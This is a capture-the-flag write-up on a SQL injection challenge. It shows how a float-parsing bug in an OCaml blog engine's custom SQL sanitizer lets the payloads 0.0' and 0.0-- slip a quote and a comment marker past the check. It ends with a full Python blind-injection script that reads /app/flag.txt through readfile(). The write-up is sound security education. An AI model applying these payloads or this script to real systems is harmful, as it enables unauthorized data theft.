# 1. Challenge Overview
The challenge provides a blog engine website written in OCaml using the Dream web framework and SQLite database. The flag is located at /app/flag.txt inside the container.

# 2. Reconnaissance
Source Code Review
The application has a typical structure. The entry point is http.ml, which defines the routes. The vulnerable endpoint is /blog/:title.
```
(* http.ml *)
let blog (db : Sql.db) (rq : Dream.request) : Dream.response Lwt.t =
  [%require_params
    [ "title" ]
  , let post_body =
      match
        Sql.sanitize_sql
          "SELECT body FROM blog_posts WHERE title = '?' AND released = 1"
          title
      (* ... *)
```
The title parameter is inserted into a raw SQL query string: title = '?'. However, it passes through a custom sanitizer function Sql.sanitize_sql.

**The Sanitizer (sanitize.ml)**
This is the core of the challenge. The sanitizer tokenizes the input and checks it against an allowlist.

Forbidden Tokens: The tokenizer explicitly creates a TQuote token for single quotes (') and the is_safe function returns false if any TQuote is found. This prevents trivial SQL injection by closing the string.

Allowed Keywords: Only specific keywords like AND, OR, IS, NULL are allowed. Dangerous keywords like UNION or SELECT are not in the whitelist.

Allowed Operators: Specific operators like =, >, <, +, - are allowed.

**Failed Attempts**
Backslash Escaping: In standard SQL injection, one might try \ to escape the closing quote (title = '\'). However, local testing with the provided Docker container confirmed that SQLite treating backslash as a literal character, not an escape character.

Token Injection: Trying to inject keywords failed because the sanitizer strictly enforces the allowlist.

# 3. The Vulnerability: OCaml Tokenizer Logic Error
The breakthrough came from white-box auditing the tokenize function in sanitize.ml, specifically how it handles floating-point numbers.
```
(* sanitize.ml : lines 104-108 *)
| c when c >= '0' && c <= '9' ->
    (* ... logic to parse number ... *)
    let num_str, end_i =
      if (* ... checks for decimal point ... *)
      then (
        let rest, final_i =
          read_while_predicate '.' end_i (fun _j c -> c >= '0' && c <= '9')
        in
        (* VULNERABILITY HERE *)
        aux (Number (float_of_string num_str) :: acc) (final_i + 1) 
      else num_str, end_i
```
**The Bug:**
When parsing a decimal number (e.g., 0.0), the code calculates final_i (the index of the first non-digit character after the dot). When recursively calling aux, it uses final_i + 1.

This creates a vulnerability that skips exactly one character immediately following a valid float, without tokenizing or checking it.

The Bypass Payload
If we send 0.0', the tokenizer:

1. Parses 0.0 as a Number.
2. Stops at ' (single quote).
3. Skips the ' due to final_i + 1.
4. Continues parsing.

The single quote is ignored by the sanitizer (so it returns Safe) but remains in the raw string sent to SQLite. This allows us to break out of the string literal!

# 4. Exploitation Strategy
We have a Blind SQL Injection scenario. We need to:

Escape the Query: Use 0.0' to inject a single quote.

Comment out the rest: We need to get rid of the trailing ' AND released = 1. Standard -- is blocked because only single - is a safe operator.

Bypass: We use the same bug again! 0.0--. The tokenizer eats the first -, sees the second - as a safe operator. SQLite sees -- (comment).

Extract Data: Since UNION/SELECT are banned, we use Boolean Blind Injection with OR.

Type Matching: readfile('/app/flag.txt') returns a BLOB. Comparing BLOB to Char (Text) fails in SQLite. We use unicode() or hex() to compare values properly.

Final Payload Structure:

0.0' OR unicode(substr(readfile(char(...)), index, 1)) > target_val OR 0.0--
5. Exploit Script
Since the server is remote, I used a binary search algorithm to optimize the extraction speed (O(log N) instead of linear).

```
import requests
import sys

TARGET_URL = "http://sqlme.quals.sigint.mx/blog/"
TARGET_FILE = "/app/flag.txt"
KNOWN_PREFIX = "PWNED{" 

def exploit():
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Exploit: OCaml Tokenizer Logic Error (Float Parsing)")
    
    path_ords = [str(ord(c)) for c in TARGET_FILE]
    path_payload = f"char({','.join(path_ords)})"
    
    flag = KNOWN_PREFIX
    index = len(KNOWN_PREFIX) + 1 
    
    print(f"[*] Starting extraction from index {index}...")

    while True:
        # Binary Search for ASCII characters (32-126)
        low = 32
        high = 126
        
        while low <= high:
            mid = (low + high) // 2
            
            # Payload Breakdown:
            # 1. 0.0' -> Exploits sanitizer to inject a single quote.
            # 2. OR ... -> Boolean logic.
            # 3. unicode(...) > mid -> Binary search comparison.
            # 4. 0.0-- -> Exploits sanitizer to inject SQL comment (--).
            
            condition = f"unicode(substr(readfile({path_payload}),{index},1))>{mid}"
            payload = f"0.0' OR {condition} OR 0.0--"
            
            try:
                # No URL encoding needed here, requests handles it
                r = requests.get(TARGET_URL + payload, timeout=5)
                
                # If we get content (200 OK and not "Not found"), the condition is TRUE
                if "Blog post not found" not in r.text and r.status_code == 200:
                    low = mid + 1
                else:
                    high = mid - 1
            
            except Exception as e:
                print(f"[!] Error: {e}")
                continue
        
        char_code = low
        if char_code == 0 or char_code > 127:
             print(f"\n[*] Extraction finished.")
             break

        char = chr(char_code)
        flag += char
        index += 1
        
        sys.stdout.write(f"\r[+] Flag: {flag}")
        sys.stdout.flush()

        if char == '}':
            print(f"\n[SUCCESS] Final Flag: {flag}")
            break

if __name__ == "__main__":
    exploit()
```

# 6. Conclusion
The challenge was not about finding a vulnerability in the OCaml language itself, but rather auditing a flawed logic implementation within a custom parser written in OCaml.

Flag: PWNED{S33_Th3_Ch4113ng1ng_w4Snt_th3_ocaml_bu7_th3_sql1t}
